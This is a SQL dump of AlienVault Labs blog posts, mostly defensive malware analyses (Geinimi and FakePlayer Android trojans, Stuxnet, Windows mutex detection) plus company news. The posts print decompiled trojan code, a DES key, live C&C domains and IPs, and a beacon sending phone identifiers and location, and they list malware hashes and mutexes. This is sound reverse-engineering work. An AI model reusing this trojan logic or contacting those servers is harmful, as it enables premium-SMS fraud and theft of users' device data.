INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (138, 'Inside Geinimi Android Trojan. Chapter One: Encrypted data and communication', 'Jaime Blasco', 'January 3, 2011 ', 'Last week a new trojan affecting Android phones has been discovered. Called Geinimi, the trojan is hidden into other existing apps.At the moment, it has been detected only in third-party Chinese app markets and Google Android Market does not seem to be compromised.The main difference between Geinimi and previously discovered Android Trojans is the potential to communicate with a remote C&C server.On the first chapter we will analyze how to obtain some encrypted data that the trojan hides as well as the communication with the C&C server.As we did in the previous analysis of Trojan-SMS.AndroidOS.FakePlayer.a we’ll use the android-apktool to obtain the app resources:opensourcesim:~# apktool d MonkeyJump2.0.apk \n\nI: Baksmaling…\n\nI: Loading resource table…\n\nI: Decoding resources…\n\nI: Loading resource table from file: /root/apktool/framework/1.apk\n\nI: Copying assets and libs…Be sure you use some case-sensitive filesystem because baskmali will crash with a case-insensitive filesystem (ofuscation??)jaime:Downloads jaimeblasco$ apktool d MonkeyJump2.0.apk \n\nI: Baksmaling…\n\nException in thread \"main\" brut.androlib.AndrolibException: brut.androlib.AndrolibException: File already exists: MonkeyJump2.0/smali/com/dseffects/MonkeyJump2/jump2/A.smali\n\n	at brut.androlib.Androlib.decodeSourcesSmali(Unknown Source)\n\n	at brut.androlib.ApkDecoder.decode(Unknown Source)\n\n	at brut.apktool.Main.cmdDecode(Unknown Source)\n\n	at brut.apktool.Main.main(Unknown Source)\n\nCaused by: brut.androlib.AndrolibException: File already exists: MonkeyJump2.0/smali/com/dseffects/MonkeyJump2/jump2/A.smali\n\n	at brut.androlib.src.SmaliDecoder.decodeClassDefItem(Unknown Source)\n\n	at brut.androlib.src.SmaliDecoder.decode(Unknown Source)\n\n	at brut.androlib.src.SmaliDecoder.decode(Unknown Source)\n\n	... 4 moreOnce we have the decoded resources we can find the crypto functions in ./smali/com/dseffects/MonkeyJump2/jump2/e/p.smali:.method public static b([B)[B\n\n    .locals 3\n\n    const-string v0, \"DES\"\n\n    :try_start_0\n\n    new-instance v0, Ljavax/crypto/spec/DESKeySpec;\n\n    sget-object v1, Lcom/dseffects/MonkeyJump2/jump2/e/k;->b:[B\n\n    invoke-direct {v0, v1}, Ljavax/crypto/spec/DESKeySpec;->([B)V\n\n    const-string v1, \"DES\"\n\n    invoke-static {v1}, Ljavax/crypto/SecretKeyFactory;->getInstance(Ljava/lang/String;)Ljavax/crypto/SecretKeyFactory;\n\n    move-result-object v1\n\n    invoke-virtual {v1, v0}, Ljavax/crypto/SecretKeyFactory;->generateSecret(Ljava/security/spec/KeySpec;)Ljavax/crypto/SecretKey;\n\n    move-result-object v0\n\n    const-string v1, \"DES\"\n\n    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;\n\n    move-result-object v1\n\n    const/4 v2, 0x1\n\n    invoke-virtual {v1, v2, v0}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V\n\n    invoke-virtual {v1, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B\n\n    :try_end_0\n\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    move-result-object v0\n\n    :goto_0\n\n    return-object v0\n\n    :catch_0\n\n    move-exception v0\n\n    const/4 v0, 0x0\n\n    goto :goto_0If we follow the function call Lcom/dseffects/MonkeyJump2/jump2/e/k;->b:[B (./smali/com/dseffects/MonkeyJump2/jump2/e/k.smali) and take a look at the routines:    .array-data 0x1\n\n        0x1t\n\n        0x2t\n\n        0x3t\n\n        0x4t\n\n        0x5t\n\n        0x6t\n\n        0x7t\n\n        0x8t\n\n    .end array-dataWe obtain the default DES key used by the trojan. With the key, we find several arrays defined in ./smali/com/dseffects/MonkeyJump2/jump2/e/p.smali that are passed to the decryption function in runtime, example:    :array_0\n\n    .array-data 0x1\n\n        0x55t\n\n        0x35t\n\n        0x2t\n\n        0x34t\n\n        0x86t\n\n        0x64t\n\n        0x21t\n\n        0x53t\n\n        0x1dt\n\n        0x21t\n\n        0x3dt\n\n        0x3at\n\n        0xd0t\n\n        0xaft\n\n        0xb6t\n\n        0x57t\n\n    .end array-dataHere you can download a python script http://alienvault-labs-garage.googlecode.com/svn/trunk/geinimi/decrypt.py [no longer available] to parse the arrays and print the decrypted data, the output is the following:python decrypt.py ./smali/com/dseffects/MonkeyJump2/jump2/e/p.smali\n\ndebug_internel\n\ndebug_outer\n\n[email protected]\n\nhttp://180.168.68.34:8080/android/getAdXml.do\n\n\n\ncontactlist\n\nsmsrecord\n\ndeviceinfo\n\nlocation\n\nsms\n\nregister\n\ncall\n\nPostUrl\n\nTicketerText\n\nTitleText\n\nContextText\n\nShowMode\n\ncall://\n\nemail://\n\nmap://\n\nsms://\n\nsearch://\n\ninstall://\n\nshortcut://\n\ncontact://\n\nwallpaper://\n\nbookmark://\n\nhttp://\n\ntoast://\n\nstartapp://\n\n.zip\n\ntel://\n\nsmsto:\n\ngeo:\n\nCmdID\n\nAdID\n\nI\n\nD\n\ncontent://sms/inbox\n\ncontent://sms/sent\n\ncom.android.launcher.action.INSTALL_SHORTCUT\n\nmethod=post&IMEI=\n\n&IMSI=\n\n&AdID=\n\n&CPID=\n\n&PTID=\n\n&SALESID=\n\n&msgType=\n\nimei=\n\n&imsi=\n\n&sms=\n\n&type=send\n\n&latitude=\n\n&longitude=\n\n&type=receive\n\n&phone=\n\n&MODEL=%s&BOARD=%s&BRAND=%s&CPU_ABI=%s&DEVICE=%s&DISPLAY=%s&FINGERPRINT=%s&HOST=%s&ID=%s&MANUFACTURER=%s\n\n&PRODUCT=%s&TAGS=%s&TIME=%s&TYPE=%s&USER=%s&SoftwareVersion=%s&Line1Number=%s&NetworkCountryIso=%s\n\n&NetworkOperator=%s&NetworkOperatorName=%s&NetworkType=%s&PhoneType=%s&SimCountryIso=%s&SimOperator=%s\n\n&SimOperatorName=%s&SimSerialNumber=%s&SimState=%s&SubscriberId=%s&VoiceMailNumber=%s&CPID=%s\n\n&PTID=%s&SALESID=%s&DID=%s&sdkver=%s&autosdkver=%s&shell=%s\n\nsuggestsms://\n\nsilentsms://\n\nmethod=postlink&IMEI=\n\n&FeatureTag=\n\ntext://\n\nmethod=show&IMEI=\n\nsuggestsms\n\nskiptime\n\nchangefrequency\n\n&DID=\n\n&sdkver=\n\n&autosdkver=\n\nIMEI\n\nIMSI\n\nCPID\n\nPTID\n\nSALESID\n\nDID\n\nsdkver\n\nautosdkver\n\nlatitude\n\nlongitude\n\n???????nim?????tom?????????ybo\n\n&applist=\n\napplist\n\nupdatehost\n\nwww.widifu.com:8080;www.udaore.com:8080;www.frijd.com:8080;www.islpast.com:8080;www.piajesj.com:8080\n\n;www.qoewsl.com:8080;www.weolir.com:8080;www.uisoa.com:8080;www.riusdu.com:8080;www.aiucr.com:8080;117.135.134.185:8080\n\ninstall\n\nuninstall\n\nshowurl\n\ncmd cp\n\ncmd pm\n\ncmd rm\n\n/data/\n\nshell\n\ncmd\n\nkill\n\nstart\n\nandroid.provider.Telephony.SMS_RECEIVED\n\n@@smskey(\n\n@@[email protected](\n\nsmskiller\n\ncontent://sms/conversations/As we can see, the author took the trouble to hide the stored data that contains for example the C&C domains:www.widifu.com:8080;\n\nwww.udaore.com:8080;\n\nwww.frijd.com:8080;\n\nwww.islpast.com:8080;\n\nwww.piajesj.com:8080;\n\nwww.qoewsl.com:8080;\n\nwww.weolir.com:8080;\n\nwww.uisoa.com:8080;\n\nwww.riusdu.com:8080;\n\nwww.aiucr.com:8080;\n\n117.135.134.185:8080If we do a static analysis of the trojan we observe http connections to these servers at five minute intervals. Example communication:POST /getAdXml.do HTTP/1.1\n\nUser-Agent: Dalvik/1.1.0 (...)\n\nHost: 117.135.134.185:8080\n\nAccept: *, */*\n\nConnection: Keep-Alive\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: 295\n\n\n\nparams=113a080016d3838bd9864d760e82d73375da7fa36b5cee41f2abfdd9d0e04c3b9aaf93bf06ed0490e670b4ab4bce6ec9a131f8d368d6a0\n\n99325da2742677388e569a08f1ae2507d0f2abfdd9d0e04c3bf77f7339d5b56855b58a6e3c30c4f07b3f7c0347e2a498ab8619d53210630\n\nf7ec73056aebc1ae56e3fef18cbf35d11c14c372859361c628de3953343b5860f9aHTTP/1.1We can find all the communication functions on /smali/com/dseffects/MonkeyJump2/jump2/e/n.smali.If we take a look to the code, we realize that the “params” content is encrypted with the same DES key used to hide the previous data. So if we decrypt the data we obtain:PTID=33050001&IMEI=000000000000000&sdkver=10.7&SALESID=0006&IMSI=310260000000000&longitude=0.0&latitude=0.0&DID=2001&autosdkver=10.7&CPID=3305As we can see the trojan is sending personal data (device identifiers; IMEI, IMSI, coordinates…).In the next chapter we will continue analyzing other advance trojan capabilities. I hope you liked it and happy new hunting year.', 'malwarereverse engineeringandroidtrojangeinimicommand-and-control', '/blogs/labs-research/inside-geinimi-android-trojan-chapter-one-encrypted-data-and-communication');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (139, 'Company status update', 'Dominique Karg', 'December 27, 2010 ', '2010 has been an incredibly exciting year for Alienvault. The goals were set high and a lot of new stuff was supposed to happen, looking back at it now I first realize what we have achieved and how much work we’ve put into it.On October 2009 both the Alienvault CEO and CTO joined a trip to Silicon Valley promoted by the “Comunidad de Madrid”, where we visited some company incubators, Google offices and did some other stuff. But that trip was our eye opener, we needed to be competing in the US market with a stronger local presence, so Alienvault LLC got up and running.The first public presence for this branch of Alienvault (originally founded on March 2007 btw) was at RSA 2010. It was fun but B-Sides, where I gave a Crappy talk http://www.ustream.tv/recorded/5162910  :P, was much more interesting. But this is about the Company, so being there on the floor and sharing exhibit space with the other big players in the SIEM marketing was definetively a huge step forward.So after the RSA (where it was four of us, our former VP of Sales and Marketing, our CEO, our future VP of Marketing and myself) I promptly decided to stay for a bit longer in the US and get the company rolling; this was too exciting.So said and done, tons of paperwork to get going, getting an accountant and finding an office for the future HQ of the company.Along the way we had the incredible luck of finding a VP of Sales in Jim Watts, who quickly implanted a very effective sales model in the US, and a VP of Marketing in Chris Blask.The change of VP of Sales made us grow over 900% from Q4 2009 to Q4 2010 and the change of VP of Marketing will end up in a brand new web image we’re going to release early next year.We found some nice offices around July too, at 1901 South Bascom Avenue, Suite 220, Campbell, CA 95008, closing down the Atlanta office and covering East, Mid and West of the US with 3 very high level Sales Directors, which will futher help us grow that part over here.Marketing and finance people also joined us in order to complete, along with an increase of pre/post/support people, a great team with which to head into 2011, with a ton of great prospects along the road :-))', '', '/blogs/labs-research/company-status-update');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (140, 'Analysis of Trojan-SMS.AndroidOS.FakePlayer.a', 'Jaime Blasco', 'August 4, 2010 ', 'Trojan-SMS.AndroidOS.FakePlayer.a is one of the first malicious programs detected on Android Smartphones.The program camouflages itself to look like a media player application and begins sending SMS to premium numbers without the user’s knowledge.To analyze the .APK android file we can use the android-apktool (http://code.google.com/p/android-apktool/) to decode the application resources and study the program behaviour.Let’s start decoding the resources with apktool:\npc201166154132:fakeplayer jaimeblasco$ apktool d RU.apk \n\nI: Baksmaling…\n\nI: Loading resource table…\n\nI: Decoding resources…\n\nI: Loading resource table from file: /Users/jaimeblasco/apktool/framework/1.apk\n\nI: Copying assets and libs…\n\nApktool obtains the following files from the APK:\npc201166154132:fakeplayer jaimeblasco$ find ./\n\n./\n\n.//RU\n\n.//RU/AndroidManifest.xml\n\n.//RU/apktool.yml\n\n.//RU/res\n\n.//RU/res/drawable\n\n.//RU/res/drawable/icon.png\n\n.//RU/res/layout\n\n.//RU/res/layout/main.xml\n\n.//RU/res/values\n\n.//RU/res/values/public.xml\n\n.//RU/res/values/strings.xml\n\n.//RU/smali\n\n.//RU/smali/org\n\n.//RU/smali/org/me\n\n.//RU/smali/org/me/androidapplication1\n\n.//RU/smali/org/me/androidapplication1/DataHelper$OpenHelper.smali\n\n.//RU/smali/org/me/androidapplication1/DataHelper.smali\n\n.//RU/smali/org/me/androidapplication1/HelloWorld.smali\n\n.//RU/smali/org/me/androidapplication1/MoviePlayer.smali\n\n.//RU/smali/org/me/androidapplication1/R$attr.smali\n\n.//RU/smali/org/me/androidapplication1/R$drawable.smali\n\n.//RU/smali/org/me/androidapplication1/R$layout.smali\n\n.//RU/smali/org/me/androidapplication1/R$string.smali\n\n.//RU/smali/org/me/androidapplication1/R.smali\n\n\n\nIf we open the file RU/AndroidManifest.xml we can see that the application request the android permission android.permission.SEND_SMS when it is installed.\n\n\n?xml version=\"1.0\" encoding=\"UTF-8\"?\n\nmanifest package=\"org.me.androidapplication1\"\n\n  xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\n    application android:icon=\"@drawable/icon\"\n\n        activity android:label=\"Movie Player\" android:name=\".MoviePlayer\"\n\n            intent-filter\n\n                action android:name=\"android.intent.action.MAIN\" \n\n                category android:name=\"android.intent.category.LAUNCHER\"\n\n            intent-filter\n\n        activity\n\n    application\n\n    uses-permission android:name=\"android.permission.SEND_SMS\"\n\n\n\nWe observe that the application does some SQLite operations on /RU/smali/org/me/androidapplication1/DataHelper$OpenHelper.smali:\n\n\n# static fields\n\n.field private static final DATABASE_NAME:Ljava/lang/String; = \"movieplayer.db\"\n\n\n\n.field private static final DATABASE_VERSION:I = 0x1\n\n\n\n.field private static final INSERT:Ljava/lang/String; = \"insert into table1(was) values (\\\'was\\\')\"\n\n\n\n.field private static final TABLE_NAME:Ljava/lang/String; = \"table1\"\n\n\n\nThe interesting operations can be found in RU/smali/org/me/androidapplication1/HelloWorld.smali:\n\n\n\n    .line 28\n\n    .local v0, m:Landroid/telephony/SmsManager;\n\n    const-string v1, \"3353\"\n\n\n\n    .line 29\n\n    .local v1, destination:Ljava/lang/String;\n\n    const-string v3, \"798657\"\n\n\n\n    .line 31\n\n    .local v3, text:Ljava/lang/String;\n\n    const/4 v2, 0x0\n\n\n\n    const/4 v4, 0x0\n\n\n\n    const/4 v5, 0x0\n\n\n\n    :try_start_0\n\n    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V\n\n    :try_end_0\n\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n\n\n    .line 37\n\n    :goto_0\n\n    const-string v1, \"3354\"\n\n\n\n    .line 39\n\n    const/4 v2, 0x0\n\n\n\n    const/4 v4, 0x0\n\n\n\n    const/4 v5, 0x0\n\n\n\n    :try_start_1\n\n    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V\n\n    :try_end_1\n\n    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1\n\n\n\nThe application uses the sendTextMessage function from the Android API:\npublic final void  sendTextMessage  (String destinationAddress, String scAddress, String text, PendingIntent sentIntent, PendingIntent deliveryIntent)  \n\nSo, the malicious program tries to send SMS’s to destination 798657 using the service center addresses (SMSC) 3353 and 3354.As we can see, this is a very simple piece of malware and it hasn’t got spreading capabilities so the risk is low because it wasn’t on Android Market.', 'malwarereverse engineeringandroid', '/blogs/labs-research/analysis-of-trojan-smsandroidosfakeplayera');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (141, 'Scada: New threat targets critical infrastructure systems', 'Jaime Blasco', 'July 26, 2010 ', 'A new malware called Stuxnet is currently targeting Scada systems. This could be one of the thousands of pieces of malware used by criminals but I want to emphasize some of the characteristics that make this attempt important enough to think over.The malware is designed specifically to attack Siemens WinCC systems. This software controls and monitors industrial processes such as water treatment, gas pipelines, electrical distribution systems and so son. The malware takes advantage of default system credentials and seems to steal schematics information. (http://www.securityfocus.com/bid/41753)Stuxnet uses a previously unknown vulnerability that affects the current versions of Windows. The vulnerability affects the Windows Shell that incorrectly parses shortcuts letting malicious code being executed when the icon is displayed. This can be exploited through USB drives or network shares. (POC: http://www.exploit-db.com/exploits/14403/)The drivers dropped by the malware are signed with a digital certificate belonging to Realtek so we can assume that the malware authors gained access to Realtek’s private key.A high number of infections have been reported in Iran, Indonesia, India, Azerbaijan and the United States. Coincidence?Who is behind Stuxnet? Anyway, this is a successful attempt to attack high-value assets around the world and whoever did this is highly skilled, well funded and possibly motivated by political, economical or military reasons.', 'malwarescadasiemens winccstuxnet', '/blogs/labs-research/scada-new-threat-targets-critical-infrastructure-systems');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (142, 'How would you describe OSSIM?', 'Dominique Karg', 'April 29, 2010 ', 'We’re currently giving http://www.alienvault.com a minor facelift.What we want to feature there is nice things actual users can say about OSSIM. So if you’re a happy OSSIM user and don’t mind being quoted (anonymous references are welcome of course) on our frontpage, please comment on this post so that we can get your feedback.The only think we’d require is a bit of context about yourself (we’re using OSSIM in this 10000 user educational network, I’ve been managing OSSIM for a bank, etc…)Every quote that makes it onto the page will be sent one of our upcoming Unofficial Official Alienvault t-shirts and a little stress-relieving alien, due to be released this summer ;-)', '', '/blogs/labs-research/how-would-you-describe-ossim');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (143, 'Coming soon…', 'Dominique Karg', 'March 25, 2010 ', 'I’m not dead nor is the blog, it’s just that twitter is so much easier for busy/lazy peopleI intend to write four more tutorial series pretty soon, namelyNetflow stuffKismet stuffOpenVPN inter-component config, setup and tricksMultiuser samples/setupI hope to be able to bring out one every two weeks aprox, let’s see how that works.', '', '/blogs/labs-research/coming-soon');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (144, 'New life, new blog platform (again!)', 'Dominique Karg', 'March 15, 2010 ', 'I decided to move from the old blogging platform to blogger.com. (And now to Labs!!!)I did setup pyblosxom for http://www.alienvault.com/blog/dk but I noticed that I was getting more and more tired of having to edit the html manually, copy it to the host, preview it, move it to the right place, etc, etc…So here is this new iteration of the blog, I hope I’ll have a chance to post much more often now with this. Focus will still be around OSSIM, Alienvault and personal rants, but as said, I expect to write more often now.Thanks a ton to all that have read the stuff I posted in the past and are still hanging around :-)For those new to the blog, the old one will be around for a long time at http://www.alienvault.com/blog/dk.DominiquePS: More info about the “new life” part as soon as I can talk about it ;-)', '', '/blogs/labs-research/new-life-new-blog-platform-again');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (145, 'Troyak-AS and Peer activity', 'Jaime Blasco', 'March 14, 2010 ', 'Last week Troyak-AS has been taken offline. The number of Zeus C&C servers has been decreasing steeply because of the coordinated operation.Hereyou can find a list of AS50215 Troyak-as peers that conform the neighborhood of one of the most active cybercrime networks.I want to share with you some graphs of these peers that shows the malicious activity of some of the AS’s involved on this network during Q1 of 2010.The data has been extracted from one of Alienvault sandnets.AS-42229 MARIAM-AS PP MariamAS-44107 PROMBUDDETAL-AS Prombuddetal LLCAS-47560 VESTEH-NET-as Vesteh LLCAS-50369 VISHCLUB-as Kanyovskiy AndriyAS-5577 ROOT SAAS-8342 RTCOMM-AS RTComm.RU Autonomous System', 'botnetvisualizationzeustags malware', '/blogs/labs-research/troyak-as-and-peer-activity');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (146, 'OSSIM 2.2 is out!', 'Dominique Karg', 'February 20, 2010 ', 'A quick saturday update. We just released OSSIM 2.2 with a ton of new features, have a look here. New screenshots and videos up on AlienVault too.This release is quite complex featuring a whole lot of new features as well as a rewrite of old ones. Please don’t hesitate posting on the forums if you’ve got any doubt or catch any bug.I know I haven’t been very active on the forums myself (what the heck, weren’t able to answer during the last months) but the whole devel team @Alienvault will make an extra effort there too in order to make this the best release we had so far. At a technical level it is without a doubt.I for myself am very excited, RSA and BSidesSF next week :-))).', 'ossim', '/blogs/labs-research/ossim-22-is-out');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (147, 'OSSIM at RSA \'10. More news', 'Dominique Karg', 'February 12, 2010 ', 'Wow, almost March and my first post this year, need to care a bit more about this. Lot of things are happening around OSSIM, AlienVault and myself these months.First, we finished a big funding round early this year which finally will enable us to consolidate OSSIM as a leader in the SIEM space (at least that’s the idea :-) ). We’re going to invest a lot into development but more importantly into community care, documentation and all those things that wrap around the product.Another big thing will be the imminent release of 2.2, with tons of new features. Check out the documentation link above which will lead you to http://www.youtube.com/alienvaulttv.More things related to this funding is the establishment of AlienVault USA. For a start I’ll be travelling a lot between Europe and the US, attending conferences, giving talks and scoping the market over there. San Francisco Bay Area is the chosen location for this move.For a start we’ll be having a small booth at RSA 2010l, booth #553. I’m very excited about this, looks like this is one of the largest and most interesting security vendor conferences available, and we’ll be there. (Going to be there with our CEO and VP Sales). As a said note, in order not get too harassed by spam around me I’ll spend a couple of days midst week at the BSidesSF, where I hope I’ll be able to do a quick lightning talk :-)That’s all for now, next time I’ll be writing from the sunny beach of Santa Cruz :)))', '', '/blogs/labs-research/ossim-at-rsa-10-more-news');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (148, 'Exploring Windows Objects ACL\'s', 'Jaime Blasco', 'December 29, 2009 ', 'In the last post, we talked about mutex objects and how to enumerate them. Today we’ll learn how to check mutex access lists from WinDBG as well as from user-mode extending the EnumerateMutex example http://alienvault-labs-garage.googlecode.com/svn/trunk/mutex/EnumerateMutex.cs.Let’s see an example using WinDBG. First query the “\\BaseNamedObjects” directory that usually contains mutex objects:lkd> !object \\BaseNamedObjects\n\nObject: e18ce788  Type: (823ed418) Directory\n\n    ObjectHeader: e18ce770 (old version)\n\n    HandleCount: 71  PointerCount: 593\n\n    Directory Object: e1001150  Name: BaseNamedObjects\n\n\n\n    Hash Address  Type          Name\n\n    ---- -------  ----          ----\n\n     00  e15a8880 SymbolicLink  Local\n\n         81e996d0 Event         userenv: Machine Group Policy has been applied\n\n         82286598 Mutant        SHIMLIB_LOG_MUTEX\n\n         82308700 Mutant        ZonesCacheCounterMutex\n\n         e1dfe298 Section       CTF.AsmListCache.FMPDefaultS-1-5-21-507921405-412668190-839522115-500\n\n         817e3ea0 Timer         userenv: refresh timer for 1048:768\n\n         e1f12ed8 Section       MSCTF.MarshalInterface.FileMap.MPJ.DI.HDGDJDJ\n\n         813f90d0 Event         CorDBIPCLSEventReadName_5752\n\n         e25994a8 Section       Cor_Private_IPCBlock_4760\n\n         e2319518 Section       Cor_Private_IPCBlock_4448\n\n         e1fc1818 Section       MSCTF.MarshalInterface.FileMap.ILD.FOB.FNOEBJE\n\n         8231e468 Event         userenv: machine policy force refresh event\n\n         82196f50 Event         jjCSCSessEvent_UM_KM_0\n\n         82111148 Event         AgentToWkssvcEventNow query one of them:lkd> !object \\BaseNamedObjects\\SHIMLIB_LOG_MUTEX\n\nObject: 82286598  Type: (823c55e0) Mutant\n\n    ObjectHeader: 82286580 (old version)\n\n    HandleCount: 8  PointerCount: 9\n\n    Directory Object: e18ce788  Name: SHIMLIB_LOG_MUTEXAnd query the object header at 82286580:lkd> dt nt!_OBJECT_HEADER  82286580\n\n   +0x000 PointerCount     : 9\n\n   +0x004 HandleCount      : 8\n\n   +0x004 NextToFree       : 0x00000008\n\n   +0x008 Type             : 0x823c55e0 _OBJECT_TYPE\n\n   +0x00c NameInfoOffset   : 0x10 \'\'\n\n   +0x00d HandleInfoOffset : 0 \'\'\n\n   +0x00e QuotaInfoOffset  : 0 \'\'\n\n   +0x00f Flags            : 0x20 \' \'\n\n   +0x010 ObjectCreateInfo : 0x8055a000 _OBJECT_CREATE_INFORMATION\n\n   +0x010 QuotaBlockCharged : 0x8055a000\n\n   +0x014 SecurityDescriptor : 0xe1756a7e\n\n   +0x018 Body             : _QUADThe security descriptor is at 0xe1756a7e so, convert it:lkd> ?? 0xe1756a7e & ~0x7\n\nunsigned int 0xe1756a78And then we can check the information we wanted:lkd> !sd 0xe1756a78 0\n\n->Revision: 0x1\n\n->Sbz1    : 0x0\n\n->Control : 0x8004\n\n            SE_DACL_PRESENT\n\n            SE_SELF_RELATIVE\n\n->Owner   : S-1-5-32-544\n\n->Group   : S-1-5-18\n\n->Dacl    :\n\n->Dacl    : ->AclRevision: 0x2\n\n->Dacl    : ->Sbz1       : 0x0\n\n->Dacl    : ->AclSize    : 0x44\n\n->Dacl    : ->AceCount   : 0x2\n\n->Dacl    : ->Sbz2       : 0x0\n\n->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE\n\n->Dacl    : ->Ace[0]: ->AceFlags: 0x0\n\n->Dacl    : ->Ace[0]: ->AceSize: 0x14\n\n->Dacl    : ->Ace[0]: ->Mask : 0x001f0001\n\n->Dacl    : ->Ace[0]: ->SID: S-1-5-18\n\n\n\n->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE\n\n->Dacl    : ->Ace[1]: ->AceFlags: 0x0\n\n->Dacl    : ->Ace[1]: ->AceSize: 0x18\n\n->Dacl    : ->Ace[1]: ->Mask : 0x00120001\n\n->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544\n\n\n\n->Sacl    :  is NULLSo now that we now how to check an object ACL via WinDBG, let’s take advantage of .NET classes inside System.Security.AccessControl namespace to query objects ACL’s.We can query a previously created mutex object via Mutex.OpenExisting method:[SecurityPermissionAttribute(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]\n\npublic static Mutex OpenExisting(\n\n    string name,\n\n    MutexRights rights\n\n)We’ll use MutexRights.ReadPermissions to be able to read ACL information and then call Mutex.GetAccessControl to read access control information.Here is the EnumerateMutex example extended to print ACL information from mutexs inside object directories:Source Code http://alienvault-labs-garage.googlecode.com/svn/trunk/mutex/EnumerateMutexACL.csBinary http://alienvault-labs-garage.googlecode.com/svn/trunk/mutex/EnumerateMutexACL.exe(Tested on Windows XP SP2 and Windows 7)Example:This method can be useful to identify weak ACL’s that can lead to a local Denial of Service. Example Winsock Mutex Vulnerability', 'directory objectskernel objectswindows kernelmutexaclmutex securityaccess control', '/blogs/labs-research/exploring-windows-objects-acls');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (149, 'Malware: Exploring mutex objects', 'Jaime Blasco', 'December 28, 2009 ', 'A mutex, also called a lock is a program object commonly used to avoid simultaneous access to a resource, such a variable.It’s used in concurrent programming to allow multiple program threads to share the same resource.Mutexs are usually used by malware creators to avoid the infection of a system by different instances of the same malware.When the trojan infects a system, the first step is to obtain a handle to a “named” mutex, if the process fails, then the malware exits.The easiest way to check for the presence of a Mutex is using the CreateMutex FunctionHANDLE WINAPI CreateMutex(\n\n	__in_opt  LPSECURITY_ATTRIBUTES lpMutexAttributes,   \n\n	__in      BOOL bInitialOwner,   __in_opt  LPCTSTR lpName );This is the same function that malware uses for checking if the system is infected so one approach to detect the presence of a piece of malware is trying to obtain a handle to the created mutex.Here is a list of some malwares (md5’s) and the Mutex created:60f733d6d0b077e4a668fb49aab44a30, xx464dg433xx16\n\nfb663100308285afb4debdcab8d67fe2, 6E523163793968624\n\n47c6313ec393d0c55d57529e2a9a418d, Security Tool\n\n72631c3c853d706daf1153b3c8fea54f, psec_once\n\nc37f47c9071eed101a67532e5d412171, YMING\n\ncdcd59a5fb80808cad7376c001586c6e, 290541776\n\n6013de3fed84d40bb173ec23f408a67e, mymutsglwork\n\n62a3f867becfea136aea4ec83a4d9c44, 5BB0650C\n\n5f33aa0b5660bc932af969301635d818, XGBPPAQHSE\n\n2e40abf579e4d8d5d1ba7df34d5e507a, _!SHMSFTHISTORY!_I’ve uploaded a small piece of code in .NET (console) using PInvoke that takes the name of the mutex to check for.Source Code http://alienvault-labs-garage.googlecode.com/svn/trunk/CheckMutex.cs [no longer available]Binary http://alienvault-labs-garage.googlecode.com/svn/trunk/CheckMutex.exe [no longer available](Tested on Windows XP SP2 and Windows 7)Example:You can use this small application to quickly check if a system is compromised if you know the name of the mutex created by the malware.In the previous post, we talked about the Windows Kernel Objects as well as the “Object directories”.We learnt how to query a directory using WinDBG and we found that Mutex as well as other kernel objects are present inside directories.So now I will explain how to query object directories from user land via NtQueryDirectoryObject to list mutexs present in the system.We will use the functions NtOpenDirectoryObject and NtQueryDirectoryObjectNTSTATUS WINAPI NtOpenDirectoryObject(   \n\n	__out  PHANDLE DirectoryHandle,   \n\n	__in   ACCESS_MASK DesiredAccess,   \n\n	__in   POBJECT_ATTRIBUTES ObjectAttributes );NTSTATUS WINAPI NtQueryDirectoryObject(\n\n	   __in       HANDLE DirectoryHandle,   \n\n	   __out_opt  PVOID Buffer,   \n\n	   __in       ULONG Length,   \n\n	   __in       BOOLEAN ReturnSingleEntry,  \n\n	   __in       BOOLEAN RestartScan,   \n\n	   __inout    PULONG Context,   \n\n	   __out_opt  PULONG ReturnLength );So the best approach to enumerate the Mutex objects is to traverse all the directories beginning with the root directory (”“\\\\”“) and check for “Mutex objects” inside the directory.We have to take into account that a directory may contains another directory so we have to traverse all of them.Here is another piece of code to enumerate all the mutex present in the system:Source Code http://alienvault-labs-garage.googlecode.com/svn/trunk/EnumerateMutex.cs [no longer available]Binary http://alienvault-labs-garage.googlecode.com/svn/trunk/EnumerateMutex.exe [no longer available](Tested on Windows XP SP2 and Windows 7)Example:Remember that Windows Objects belongs to a namespace and each user session has a different namespace so you will retrieve different results from different user sessions.I was looking at some mutex results 